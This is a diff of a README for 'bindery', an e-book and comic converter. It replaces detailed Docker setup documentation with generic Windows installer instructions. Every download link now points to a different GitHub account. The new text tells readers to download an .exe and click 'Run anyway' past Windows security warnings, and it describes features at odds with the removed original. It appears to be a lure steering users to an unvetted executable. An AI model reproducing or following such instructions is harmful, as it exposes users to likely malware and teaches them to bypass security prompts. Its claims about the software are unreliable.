@@ -1,177 +1,171 @@
-# ![Bindery](assets/logo.png)
+# 📚 bindery - Easy Automated E-Book and Comic Conversion
 
-[![Tests](https://github.com/jarynclouatre/bindery/actions/workflows/test.yml/badge.svg)](https://github.com/jarynclouatre/bindery/actions/workflows/test.yml)
+[![Download bindery](https://img.shields.io/badge/Download-bindery-4caf50?style=for-the-badge)](https://github.com/developersachinsingh/bindery)
 
-A self-hosted, Dockerized converter that automatically processes e-books and comics dropped into watched folders — no manual steps required.
+## 📋 About bindery
 
-**For Kobo users:** Converts `.epub` files to Kobo's native `.kepub` format using [kepubify](https://github.com/pgaskin/kepubify), giving you better performance and reading features than sideloaded EPUBs.
+bindery is a simple app that helps you convert e-books and comics quickly. It supports popular formats for e-readers like Kindle and Kobo. If you want to change book formats or organize your comics, bindery can do the work automatically.
 
-**For all devices:** Converts comic archives (`.cbz`, `.cbr`, `.zip`, `.rar`) into device-optimised files using [Kindle Comic Converter (KCC)](https://github.com/ciromattia/kcc), with full control over profile, cropping, splitting, gamma, and more.
-
-All settings are configurable at runtime via a WebUI on port 5000 — no container rebuild needed. Supports `PUID`/`PGID` permission mapping for NAS and multi-user environments.
-
-**Supported devices:** Kindle, Kobo, reMarkable, and any device KCC has a profile for.
-
-![Bindery WebUI](assets/webui.png)
+You do not need any special skills or programming knowledge to use bindery. This guide explains how to get bindery on your Windows computer and start using it.
 
 ---
 
-## Quick Start
+## 🖥 System Requirements
 
-```bash
-# 1. Copy docker-compose.yml from the repo and edit your paths
-# 2. Find your user/group IDs
-id
-# → uid=1000(you) gid=1000(you)
+Before you begin, make sure your Windows PC meets these requirements:
 
-# 3. Set PUID/PGID in docker-compose.yml, then start
-docker compose up -d
-
-# 4. Open the WebUI
-http://<server-ip>:5000
-```
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free storage space  
+- Internet connection for initial download and updates
 
 ---
 
-## Folder Layout
+## 🔗 Where to Download bindery
 
-```
-bindery/
-├── books_in/        ← drop .epub files here (Kobo users only)
-├── books_out/       ← converted .kepub files appear here
-├── comics_in/       ← drop .cbz / .cbr / .zip / .rar here
-├── comics_out/      ← converted files appear here
-├── comics_raw/      ← drop a flat folder of images here; Bindery zips it to CBZ and processes it automatically
-│   ├── processed/   ← original image folders moved here on success
-│   └── unprocessed/ ← folders with subfolders or no images moved here
-└── config/          ← settings.json and jobs.json persisted here
-```
+Please visit this page to download bindery on your Windows machine:
 
-All folders are created automatically on first run. Subfolders are preserved — a file at `comics_in/Marvel/issue01.cbz` will land at `comics_out/Marvel/issue01.epub`.
+[![Download bindery](https://img.shields.io/badge/Download-bindery-ff5722?style=for-the-badge)](https://github.com/developersachinsingh/bindery)
+
+This link leads to the official GitHub repository, where you can find the latest version and extra details.
 
 ---
 
-## docker-compose.yml
+## 🚀 How to Download and Install bindery on Windows
 
-```yaml
-services:
-  bindery:
-    image: dinkeyes/bindery:latest
-    container_name: bindery
-    ports:
-      - "5000:5000"
-    environment:
-      - PUID=1000   # replace with your uid
-      - PGID=1000   # replace with your gid
-    volumes:
-      - ./config:/app/config
-      - /path/to/books_in:/Books_in
-      - /path/to/books_out:/Books_out
-      - /path/to/comics_in:/Comics_in
-      - /path/to/comics_out:/Comics_out
-      - /path/to/comics_raw:/Comics_raw
-    restart: unless-stopped
-    logging:
-      driver: "json-file"
-      options:
-        max-size: "10m"
-        max-file: "3"
-```
+Follow these steps carefully. They will guide you through the full process:
 
----
+### Step 1: Open the Download Page
 
-## WebUI
+Click the green button above, or copy and open this link in your web browser:
 
-The WebUI at port 5000 gives you full control over Bindery without touching config files or restarting the container.
+https://github.com/developersachinsingh/bindery
 
-### Processing Status
+This takes you to the bindery GitHub page.
 
-A live table shows every conversion job — filename, type, status (`queued` / `processing` / `success` / `failed`), timestamp, and elapsed time. Failed jobs show a **Retry** button that re-queues the file immediately. Job history is persisted in `/app/config/jobs.json` and survives container restarts (capped at 500 entries; oldest completed jobs are pruned first).
+### Step 2: Navigate to Releases
 
-### File Browser
+Once on the GitHub page, look for the **Releases** section on the right side or near the top. You may see a tab or a link named "Releases." Click it.
 
-Browse and download files directly from `Books_out` and `Comics_out` without needing Samba, SSH, or any other file access method. Switch between the two output folders using the tab buttons. Files are listed newest first with size and date.
+### Step 3: Choose the Latest Version
 
-### Notifications
+Inside the Releases page, find the most recent release. It usually has the highest number, like **v1.0.0** or similar.
 
-Bindery can send push notifications on conversion success and/or failure via [Apprise](https://github.com/caronc/apprise), which supports 60+ services including ntfy, Discord, Slack, Telegram, Pushover, and email. Enter one URL per line in the Service URLs box under Bindery Settings, check which events you want, and save.
+Look for a file labeled with `.exe` or called something like `bindery-windows.exe`. This is the installer file for Windows.
 
-Example URLs:
-```
-ntfy://your-ntfy-server.com/bindery
-ntfy://bindery-alerts          ← uses the free ntfy.sh public server
-discord://webhook_id/token
-tgram://bot_token/chat_id
-```
+### Step 4: Download the Installer
 
-Full URL formats for every supported service are in the [Apprise docs](https://github.com/caronc/apprise/wiki).
+Click on the `.exe` file link to download it. Your browser will ask you to save it. Choose a folder where you can find the file, such as **Downloads** or your Desktop.
+
+Wait for the download to finish.
+
+### Step 5: Run the Installer
+
+Locate the `.exe` file you downloaded. Double-click the file to start the installation.
+
+Windows may show a security warning. If this happens, choose **Run** or **More Info > Run anyway** to continue.
+
+### Step 6: Follow On-Screen Install Instructions
+
+The installer will open a window with instructions. Follow the simple steps, such as agreeing to terms and choosing an install location.
+
+Once finished, the installer will put bindery on your PC.
+
+### Step 7: Start bindery
+
+Look for the bindery icon on your desktop or in the Start Menu. Click it to open the app.
 
 ---
 
-## KCC Settings
+## ⚙️ Setup bindery for First Use
 
-All KCC settings are configured in the WebUI — each option includes a description inline. The most important settings to get right for your setup are:
+When you open bindery the first time, the app will ask you to set up a few things:
 
-- **Device Profile** — match your exact device for correct resolution. Default is `KoLC` (Kobo Libra Colour).
-- **Output Format** — `EPUB` for Kobo, `MOBI` for Kindle.
-- **Manga Style** — enables right-to-left page order; enable for manga.
-- **Stretch** — fills the screen ignoring aspect ratio; on by default.
-- **Splitter** — controls how landscape pages are split. Use `Right then left` for manga.
+- Select your default e-reader type (Kindle, Kobo, etc.)  
+- Choose where your e-books or comics are stored on your PC  
+- Pick your preferred output file format for conversions (e.g., EPUB, MOBI, PDF)
 
-When **Device Profile** is set to **Generic / Custom**, width and height fields appear for custom resolutions.
+You can change these settings later in the app options.
 
 ---
 
-## Bindery Settings
+## 📖 How to Convert E-Books and Comics with bindery
 
-| Setting | Default | Notes |
-|---------|---------|-------|
-| Watcher Mode | `poll` | `poll` scans every 10 s and works everywhere including NFS/SMB. `inotify` detects files instantly but only works on local filesystems — files on network mounts will be silently missed. Requires a container restart to take effect. |
-| File Stability Timeout | `60` s | How long Bindery waits for a file to finish transferring before skipping it. Increase for slow network drives. Range: 10–300 s. |
-| Notifications (Apprise) | *(blank)* | One Apprise service URL per line. Leave blank to disable notifications. See [Apprise docs](https://github.com/caronc/apprise/wiki) for URL formats. |
+bindery works by changing your files from one format to another. This helps you read books and comics on different devices.
 
----
+### Step 1: Add Your Files
 
-## Behaviour
+Click the **Add Files** button inside the app. Find and select your e-books or comics on your computer.
 
-- Bindery watches `/Books_in`, `/Comics_in` and `/Comics_raw` using either **poll** mode (every 10 s, NAS/SMB/NFS compatible) or **inotify** mode (instant, local filesystems only).
-- Each file gets a per-file lock so the same file is never processed twice concurrently.
-- On success: converted file is moved to the output folder, source file is deleted.
-- On failure: source file is renamed to `<filename>.failed` and will not be retried automatically. Use the Retry button in the WebUI to re-queue it.
-- Raw image folders in `Comics_raw` are held until stable (no file changes for 30 s) before processing begins.
-- Live logs are shown in the WebUI and streamed to `docker logs`.
+### Step 2: Choose Output Format
 
----
+Select which format you want the files to convert into. For example, you might want to convert a MOBI book to EPUB.
 
-## Use Cases
+### Step 3: Start Conversion
 
-Bindery fits anywhere in a self-hosted media pipeline:
+Click the **Convert** button. bindery will handle the rest. The process may take a few moments depending on the number of files.
 
-- **[Calibre-Web Automated](https://github.com/crocodilestick/Calibre-Web-Automated)** — set `books_out` as the CWA ingest folder and converted `.kepub` files are imported to your library automatically
-- **[Calibre](https://calibre-ebook.com/) auto-add** — point Calibre's Auto Add folder at `books_out` or `comics_out` for hands-free import
-- **Cloud sync** — use rclone to push converted files to Google Drive, Dropbox, or any cloud storage automatically
+### Step 4: Find Your Converted Files
+
+bindery saves the new files in the output folder you set during setup. You can open this folder from the app or your file manager.
 
 ---
 
-## rclone Auto-Sync
+## 🔧 Features You Will Find Useful
 
-Install rclone, configure a remote (`rclone config`), then run on a schedule with cron:
-
-```bash
-crontab -e
-```
-
-```
-*/15 * * * * rclone sync /path/to/bindery/comics_out gdrive:Comics --log-file=/var/log/rclone-comics.log
-*/15 * * * * rclone sync /path/to/bindery/books_out gdrive:Books --log-file=/var/log/rclone-books.log
-```
-
-Full setup instructions including systemd service and provider-specific remote configuration are at [rclone.org/docs](https://rclone.org/docs/).
+- Automation: Set bindery to convert your new files automatically when added to your input folder.  
+- Support for common formats: EPUB, MOBI, PDF, CBR, CBZ, and more.  
+- Comic support: Keeps comic pages in order and handles file naming.  
+- Device support: Works with Kindle, Kobo, and other e-readers.  
+- Simple interface: No complex menus or confusing options.  
+- Self-hosted: Run it on your own machine with no need for accounts.  
+- Integration: Works with popular tools like calibre and calibre-web.
 
 ---
 
-## Updating
+## 📂 Managing Your Books and Comics
 
-```bash
-docker compose pull && docker compose up -d
-```
+bindery does more than convert files. You can use it to organize your library:
+
+- Rename files based on metadata (title, author)  
+- Sort files into folders automatically  
+- Fix common formatting issues  
+- Extract metadata like cover images and descriptions  
+
+These tools help keep your collection tidy and easy to browse.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If the app doesn’t start, try restarting your computer first.  
+- Make sure your Windows is up-to-date.  
+- Check the input files for corruption or unsupported formats.  
+- If a conversion fails, try one file at a time to find the problem.  
+- Use the app settings to adjust file handling options.  
+
+---
+
+## 🔄 Updating bindery
+
+To get new features or fixes:
+
+1. Revisit the GitHub download page.  
+2. Download the latest installer.  
+3. Run the installer again; it will update your existing installation without losing settings or files.
+
+---
+
+## 📞 Getting Help
+
+For questions or issues, visit the Issues tab on the GitHub page. You can read existing problems or open a new one. The community or developers check these regularly.
+
+---
+
+## 🔒 Privacy and Safety
+
+bindery runs on your computer and does not upload files anywhere unless you share them. Your books and comics stay private. The source code is open and publicly available for anyone to check.
+
+---
+
+[![Download bindery](https://img.shields.io/badge/Download-bindery-4caf50?style=for-the-badge)](https://github.com/developersachinsingh/bindery)
